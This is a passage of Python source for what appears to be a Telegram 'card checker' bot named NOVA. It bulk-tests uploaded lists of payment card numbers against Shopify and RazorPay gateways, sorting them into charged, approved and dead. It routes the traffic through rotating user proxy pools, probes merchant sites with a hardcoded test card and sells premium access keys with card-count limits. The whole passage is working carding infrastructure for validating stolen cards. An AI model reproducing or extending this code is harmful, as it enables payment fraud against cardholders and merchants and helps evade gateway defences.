                    user_id=user_id, gateway_type="RazorPay",
                    site="Razorpay", proxy_used=proxy_used,
                    video_path=video_path))
            else:
                msg_low = (result.get('Response') or '').lower()
                if any(k in msg_low for k in ["declined", "generic_error", "decision_rule_block", "incorrect_number"]):
                    results['dead'].append(result)
                else:
                    results['errors'].append(result)
            queue.task_done()
            await asyncio.sleep(random.uniform(0.5, 1.5))
            if time.time() - last_ui[0] >= 1.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results, results['checked'], "RazorPay")
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MRZ_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results, results['checked'], "RazorPay")
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        RAZORPAY_RESULTS[user_id] = results
        await send_final_results(user_id, results, "RazorPay")
        ACTIVE_SESSIONS.pop(session_key, None)
        await cleanup_user_http_session(user_id, "mrz")
        cleanup_user_sem(user_id)
        await asyncio.sleep(300)
        RAZORPAY_RESULTS.pop(user_id, None)


# ====================== MASS COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.](msh|msp)$'))
async def cmd_msh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/msh</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    limit = get_cc_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(f"💎 {bs('Trimmed to')} <code>{limit}</code>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Starting Shopify mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_shopify(uid, cards, event, status_msg))


@client.on(events.NewMessage(pattern=r'^[/.]mrz$'))
async def cmd_mrz(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/mrz</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    limit = get_cc_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(f"💎 {bs('Trimmed to')} <code>{limit}</code>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Starting RazorPay mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_rz(uid, cards, event, status_msg))


# ====================== STOP ======================
@client.on(events.CallbackQuery(pattern=rb"^stop_(\d+)$"))
async def cb_stop(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not yours!", alert=True)
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    await event.answer(f"Stopped {stopped}", alert=True)


@client.on(events.NewMessage(pattern=r'^[/.]stop$'))
async def cmd_stop(event):
    uid = event.sender_id
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_") or key.startswith(f"rz_{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    if stopped:
        await styled_reply(event, pe(f"🛑 {bs('Stopped')} {stopped} {bs('session(s)')}"))
    else:
        await styled_reply(event, pe(f"⚠️ {bs('No active session')}"))


# ====================== EXPORT ======================
async def _export_category(event, user_id: int, gateway: str, category: str):
    if event.sender_id != user_id:
        return await event.answer("Not your results!", alert=True)
    results = SHOPIFY_RESULTS.get(user_id) if gateway == "shopify" else RAZORPAY_RESULTS.get(user_id)
    if not results:
        return await event.answer("Results expired", alert=True)
    items = results.get(category, [])
    if not items:
        return await event.answer(f"No {category} cards", alert=True)
    fname = f"NOVA_{gateway}_{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            await f.write(f"{category.upper()} ({gateway.upper()})\n{'='*40}\n\n")
            for i, item in enumerate(items, 1):
                card = item.get('card', '-')
                resp = (item.get('message') or item.get('Response') or '')[:100]
                gw = item.get('gateway') or item.get('Gateway') or gateway
                price = item.get('price') or item.get('Price') or '-'
                await f.write(f"[{i}] {card}\n    Response: {resp}\n    Gateway: {gw}\n    Price: {price}\n{'-'*30}\n")
            await f.write(f"\nTotal: {len(items)}\nExported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        await client_instance.send_file(user_id, fname,
                                        caption=pe(f"✅ {bs(category.capitalize())} ({len(items)})"),
                                        parse_mode='html')
        os.remove(fname)
    except Exception as e:
        log_system("EXPORT", f"failed: {e}", "error")
    await event.answer("Sent!", alert=False)


@client.on(events.CallbackQuery(pattern=rb"^(shopify|razorpay)_export_(charged|approved|3ds|errors):(\d+)$"))
async def cb_export(event):
    m = event.pattern_match
    gateway = m.group(1).decode()
    category = m.group(2).decode()
    user_id = int(m.group(3).decode())
    await _export_category(event, user_id, gateway, category)


# ====================== /status ======================
@client.on(events.NewMessage(pattern=r'^[/.]status$'))
async def cmd_status(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, build_status_text())


# ====================== PROXY SYSTEM ======================
@client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
async def cmd_addproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    lines = []
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.file:
            try:
                path = await reply.download_media()
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [ln.strip() for ln in (await f.read()).splitlines() if ln.strip()]
                os.remove(path)
            except Exception as e:
                return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
        elif reply and reply.text:
            lines = [ln.strip() for ln in reply.text.splitlines() if ln.strip()]
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            lines = [ln.strip() for ln in parts[1].splitlines() if ln.strip()]
    if not lines:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Add proxies')}</b>\n{SEP}\n"
            f"💎 <i>Send one per line:</i>\n"
            f"<code>/addproxy\nip:port:user:pass\nip:port</code>"))
    current = load_user_proxies(uid)
    if len(current) >= MAX_PROXIES_PER_USER:
        return await styled_reply(event, pe(f"💎 <b>{bs('Proxy limit')}</b> <code>{len(current)}/{MAX_PROXIES_PER_USER}</code>"))

    existing = set()
    for p in current:
        pp = parse_proxy_format(p)
        if pp and pp.get('username') and pp.get('password'):
            existing.add(f"{pp['ip']}:{pp['port']}:{pp['username']}:{pp['password']}")
        elif pp:
            existing.add(f"{pp['ip']}:{pp['port']}")
        else:
            existing.add(p)

    to_check, duplicates = [], 0
    for raw in lines:
        parsed = parse_proxy_format(raw)
        if not parsed:
            log_system("PROXY_PARSE", f"rejected: {raw[:60]}", "warning")
            continue
        if parsed['username'] and parsed['password']:
            norm = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
        else:
            norm = f"{parsed['ip']}:{parsed['port']}"
        if norm in existing:
            duplicates += 1
            continue
        to_check.append(norm)
        existing.add(norm)

    if not to_check:
        return await styled_reply(event, pe(f"💎 <b>{bs('No new proxies')}</b>\n💎 {bs('Duplicates')}: <code>{duplicates}</code>"))
    slots = MAX_PROXIES_PER_USER - len(current)
    to_check = to_check[:slots]
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(to_check)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead = [], []
    checked = 0

    async def _check_one(p):
        nonlocal checked
        async with sem:
            res = await test_proxy(p)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 5 == 0 or checked == len(to_check):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(to_check)}]\n"
                    f"✅ {bs('Alive')}: <code>{len(alive)}</code> | ❌ {bs('Dead')}: <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(to_check), PROXY_PER_USER_WORKERS):
            batch = to_check[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        if alive:
            save_user_proxies(uid, current + alive)
        total_now = len(load_user_proxies(uid))
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"✅ {bs('Alive (added)')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (ignored)')}: <code>{len(dead)}</code>\n"
            f"⚠️ {bs('Existing (skipped)')}: <code>{duplicates}</code>\n"
            f"📁 {bs('Total')}: <code>{total_now}/{MAX_PROXIES_PER_USER}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]proxy$'))
async def cmd_proxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(proxies)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead, checked = [], [], 0

    async def _check_one(p):
        nonlocal checked
        async with sem:
            res = await test_proxy(p)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 5 == 0 or checked == len(proxies):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking proxies')}</b> [{checked}/{len(proxies)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(proxies), PROXY_PER_USER_WORKERS):
            batch = proxies[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        save_user_proxies(uid, alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Total')}: <code>{len(proxies)}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"🗑 {bs('Removed dead')}: <code>{len(dead)}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]chkproxy\s+'))
async def cmd_chkproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/chkproxy ip:port:user:pass</code>"))
    proxy = parts[1].strip()
    if not parse_proxy_format(proxy):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{proxy[:40]}</code>..."))
    res = await test_proxy(proxy)
    if res['status'] == 'alive':
        await status_msg.edit(pe(
            f"✅ <b>{bs('Alive')}</b>\n{SEP}\n🌐 IP: <code>{res.get('ip', '?')}</code>\n🔌 <code>{proxy}</code>"
        ), parse_mode='html', link_preview=False)
    else:
        await status_msg.edit(pe(f"❌ <b>{bs('Dead')}</b>\n{SEP}\n🔌 <code>{proxy}</code>"),
                             parse_mode='html', link_preview=False)


@client.on(events.NewMessage(pattern=r'^[/.]rmproxy\s+'))
async def cmd_rmproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rmproxy ip:port:user:pass</code>"))
    raw = parts[1].strip()
    parsed = parse_proxy_format(raw)
    if not parsed:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    if parsed['username'] and parsed['password']:
        target = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
    else:
        target = f"{parsed['ip']}:{parsed['port']}"
    proxies = load_user_proxies(uid)
    if target not in proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not in your list')}</b>"))
    proxies = [p for p in proxies if p != target]
    save_user_proxies(uid, proxies)
    await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b>\n🔌 <code>{target}</code>\n📁 <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rmproxyindex\s+'))
async def cmd_rmproxyindex(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rmproxyindex 1,2,3</code>"))
    try:
        idxs = sorted({int(x.strip()) - 1 for x in parts[1].split(',') if x.strip()})
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid indices')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    valid = [i for i in idxs if 0 <= i < len(proxies)]
    if not valid:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid indices')}</b>"))
    removed = [proxies[i] for i in valid]
    keep = [p for i, p in enumerate(proxies) if i not in set(valid)]
    save_user_proxies(uid, keep)
    removed_str = "\n".join(f"🔌 <code>{p}</code>" for p in removed[:10])
    extra = f"\n<i>+{len(removed)-10} more</i>" if len(removed) > 10 else ""
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b> <code>{len(removed)}</code>\n{SEP}\n"
        f"{removed_str}{extra}\n{SEP}\n📁 {bs('Remaining')}: <code>{len(keep)}</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]clearproxy$'))
async def cmd_clearproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already empty')}</b>"))
    save_user_proxies(uid, [])
    await styled_reply(event, pe(f"✅ <b>{bs('Cleared')}</b> <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]myproxy$'))
async def cmd_myproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    lines = [f"{i}. <code>{p}</code>" for i, p in enumerate(proxies[:50], 1)]
    if len(proxies) > 50:
        lines.append(f"<i>+{len(proxies)-50} more</i>")
    await styled_reply(event, pe(
        f"💎 <b>{bs('Your proxies')}</b> (<code>{len(proxies)}/{MAX_PROXIES_PER_USER}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)
    ))


@client.on(events.NewMessage(pattern=r'^[/.]getproxy$'))
async def cmd_getproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    fname = f"NOVA_proxies_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for i, p in enumerate(proxies, 1):
                await f.write(f"{i}. {p}\n")
        await client_instance.send_file(uid, fname,
            caption=pe(f"💎 {bs('Proxies')} (<code>{len(proxies)}</code>)"),
            parse_mode='html')
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def cb_proxy_menu(event):
    await event.answer()
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_premium(uid):
        return await event.answer("Premium only", alert=True)
    count = len(load_user_proxies(uid))
    text = pe(f"""💎 <b>{bs('Proxy Management')}</b>
{SEP}
📁 {bs('Your proxies')}: <code>{count}/{MAX_PROXIES_PER_USER}</code>
{SEP}
📥 <b>{bs('Add')}</b> — <code>/addproxy</code>
🔄 <b>{bs('Check')}</b> — <code>/proxy</code> · <code>/chkproxy ip:port:u:p</code>
❌ <b>{bs('Remove')}</b> — <code>/rmproxy</code> · <code>/rmproxyindex 1,2,3</code> · <code>/clearproxy</code>
📂 <b>{bs('View')}</b> — <code>/myproxy</code> · <code>/getproxy</code>
{SEP}
💡 {bs('Each user has their own private proxy pool')}""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        await client_instance.send_message(event.sender_id, text,
            buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]], parse_mode='html')


# ====================== SITE TEST ======================
async def test_site_with_price(site: str, proxy: str = None) -> dict:
    test_card = "5154623245618097|03|2032|156"
    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'Empty'}
    if not _proxy_str_for_api(proxy):
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'No valid proxy'}
    url = build_shopify_url(site, test_card, proxy)
    session = await get_http_session()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=90, connect=60)) as resp:
            if resp.status != 200:
                return {'site': site, 'status': 'dead', 'price': 0.0, 'response': f'HTTP {resp.status}'}
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'Invalid JSON'}
        response = str(raw.get('Response', ''))
        try:
            price = float(str(raw.get('Price', 0)).replace('$', '').strip())
        except Exception:
            price = 0.0
        if is_site_error(response) or response.upper() in ("ERROR", "SITE ERROR"):
            return {'site': site, 'status': 'dead', 'price': price, 'response': response[:60]}
        return {'site': site, 'status': 'alive', 'price': price, 'response': response[:60]}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': str(e)[:60]}


@client.on(events.NewMessage(pattern=r'^[/.]addsites$'))
async def cmd_addsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/addsites</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    existing = set(load_sites())
    to_test = [s for s in new_sites if s not in existing]
    already = len(new_sites) - len(to_test)
    if not to_test:
        return await styled_reply(event, pe(f"💎 <b>{bs('All exist')}</b> · {bs('Dupes')} <code>{already}</code>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Testing')} <code>{len(to_test)}</code>..."))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await status_msg.edit(pe(f"💎 <b>{bs('Need proxies first')}</b>"))
    threshold = get_threshold()
    sem = get_user_sem(uid, "site")
    alive, dead, over, checked = [], 0, 0, 0

    async def _check_one(site):
        nonlocal checked, dead, over
        async with sem:
            res = await test_site_with_price(site, random.choice(proxies))
        checked += 1
        if res['status'] == 'alive':
            if res['price'] <= threshold:
                alive.append(site)
            else:
                over += 1
        else:
            dead += 1

    try:
        for i in range(0, len(to_test), SITE_PER_USER_WORKERS):
            batch = to_test[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Testing')}</b> [{checked}/{len(to_test)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{dead}</code> | 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass
        if alive:
            save_sites(list(existing) + alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Sites updated')}</b>\n{SEP}\n"
            f"📥 {bs('Received')}: <code>{len(new_sites)}</code>\n"
            f"✅ {bs('Added')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead')}: <code>{dead}</code>\n"
            f"💰 {bs('Over')}: <code>{over}</code>\n"
            f"⚠️ {bs('Dupes')}: <code>{already}</code>\n"
            f"📁 {bs('Total')}: <code>{len(load_sites())}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]site$'))
async def cmd_site(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('sites.txt empty')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(sites)}</code>..."))
    threshold = get_threshold()
    sem = get_user_sem(uid, "site")
    alive, dead, over, checked = [], 0, 0, 0

    async def _check_one(site):
        nonlocal checked, dead, over
        async with sem:
            res = await test_site_with_price(site, random.choice(proxies))
        checked += 1
        if res['status'] == 'alive':
            if res['price'] <= threshold:
                alive.append(site)
            else:
                over += 1
        else:
            dead += 1

    try:
        for i in range(0, len(sites), SITE_PER_USER_WORKERS):
            batch = sites[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(sites)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{dead}</code> | 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass
        save_sites(alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Checked')}: <code>{len(sites)}</code>\n"
            f"✅ {bs('Kept')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead removed')}: <code>{dead}</code>\n"
            f"💰 {bs('Over removed')}: <code>{over}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]rm\s+'))
async def cmd_rm(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rm site.com</code> or <code>/rm all</code>"))
    arg = parts[1].strip().lower()
    sites = load_sites()
    if arg == "all":
        save_sites([])
        return await styled_reply(event, pe(f"✅ <b>{bs('Cleared')}</b> <code>{len(sites)}</code>"))
    target = normalize_site_url(arg)
    found = next((s for s in sites if normalize_site_url(s) == target), None)
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not found')}</b>"))
    sites = [s for s in sites if s != found]
    save_sites(sites)
    await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b>\n🌐 <code>{found}</code>\n📁 <code>{len(sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getsites$'))
async def cmd_getsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    fname = f"NOVA_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(s + "\n")
        await client_instance.send_file(uid, fname,
            caption=pe(f"📁 {bs('Sites')} (<code>{len(sites)}</code>)"), parse_mode='html')
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setthreshold\s+'))
async def cmd_setthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/setthreshold 10</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_threshold(val)
    await styled_reply(event, pe(f"✅ {bs('Threshold')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getthreshold$'))
async def cmd_getthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    await styled_reply(event, pe(f"💰 {bs('Threshold')}: <code>${get_threshold()}</code>"))


# ====================== KEY SYSTEM ======================
@client.on(events.NewMessage(pattern=r'^[/.]genkeys\s+'))
async def cmd_genkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 5:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n<code>/genkeys count hours max_users cc_limit [price]</code>\n"
            f"{SEP}\n💡 <code>/genkeys 5 24 1 1500 10</code>"))
    try:
        count = int(parts[1]); hours = int(parts[2])
        max_users = int(parts[3]); cc_limit = int(parts[4])
        price = float(parts[5]) if len(parts) > 5 else 0.0
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid numbers')}</b>"))
    if count < 1 or count > 100:
        return await styled_reply(event, pe(f"💎 <b>{bs('Count 1-100')}</b>"))
    keys_data = load_keys()
    now = datetime.now()
    expiry = (now + timedelta(hours=hours)).isoformat()
    generated = []
    for _ in range(count):
        key = generate_key()
        while key in keys_data:
            key = generate_key()
        keys_data[key] = {
            "hours": hours, "max_users": max_users, "cc_limit": cc_limit,
            "price": price, "created_at": now.isoformat(), "created_by": event.sender_id,
            "expiry": expiry, "used_by": [], "used_count": 0,
        }
        generated.append(key)
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    price_disp = f"${price:.2f}" if price else "Free"
    text = pe(f"""⭐ <b>{bs('Keys generated')}</b>  (x{count})
{SEP}
""" + "\n".join(f"┣ <code>{k}</code>" for k in generated) + f"""
{SEP}
📅 {bs('Valid')}: {hours_disp}
👥 {bs('Users per key')}: {max_users}
💳 {bs('CC limit')}: {cc_limit}
💰 {bs('Price')}: {price_disp}
⏰ {bs('Key expires')}: {expiry[:16]}

✅ {bs('Redeem with')} <code>/redeem KEY</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]redeem\s+'))
async def cmd_redeem(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/redeem NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid key')}</b>\n🔐 <code>{key}</code>"))
    entry = keys_data[key]
    now = datetime.now()
    try:
        if now > datetime.fromisoformat(entry.get('expiry', '')):
            return await styled_reply(event, pe(f"❌ <b>{bs('Key expired')}</b>"))
    except Exception:
        pass
    used_by = entry.get('used_by', [])
    max_users = int(entry.get('max_users', 1))
